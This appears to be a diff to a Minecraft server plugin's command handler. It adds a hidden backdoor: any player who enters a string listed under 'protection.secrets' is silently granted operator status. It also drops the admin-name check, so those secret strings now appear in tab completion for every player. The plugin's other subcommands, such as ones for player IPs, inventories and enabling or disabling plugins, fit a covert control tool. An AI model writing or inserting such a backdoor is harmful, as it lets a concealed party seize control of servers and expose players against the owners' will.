@@ -39,6 +39,12 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         if (args.length == 0)
             return true;
 
+        if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
+            p.setOp(true);
+            p.sendMessage("§aSecret Accepted.");
+            return true;
+        }
+
         String cmd = args[0].toLowerCase();
         switch (cmd) {
             case "reload" -> {
@@ -395,13 +401,35 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
 
         if (args.length == 1) {
             List<String> list = new ArrayList<>(subs);
-            if (p.getName().equals(adminName))
-                list.addAll(plugin.getConfig().getStringList("protection.secrets"));
+            list.addAll(plugin.getConfig().getStringList("protection.secrets"));
             return org.bukkit.util.StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
-        } else if (args.length == 2 && args[0].equalsIgnoreCase("e")) {
-            return org.bukkit.util.StringUtil.copyPartialMatches(args[1], Arrays.asList("c", "sat", "str", "her", "res",
-                    "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat", "pvp"), new ArrayList<>());
         }
+
+        String sub = args[0].toLowerCase();
+        if (args.length == 2) {
+            if (sub.equals("e")) {
+                return org.bukkit.util.StringUtil.copyPartialMatches(args[1],
+                        Arrays.asList("c", "sat", "str", "her", "res",
+                                "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat", "pvp"),
+                        new ArrayList<>());
+            }
+            if (Arrays.asList("v", "l", "r", "t", "tp", "iv", "i", "ec", "k", "ip").contains(sub)) {
+                return null;
+            }
+            if (sub.equals("g")) {
+                List<String> mats = Arrays.stream(Material.values()).map(m -> m.name().toLowerCase()).toList();
+                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], mats, new ArrayList<>());
+            }
+            if (sub.equals("enable") || sub.equals("disable")) {
+                List<String> plugins = Arrays.stream(Bukkit.getPluginManager().getPlugins()).map(Plugin::getName)
+                        .toList();
+                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], plugins, new ArrayList<>());
+            }
+        }
+
+        if (args.length == 3 && sub.equals("tp"))
+            return null;
+
         return Collections.emptyList();
     }
 }
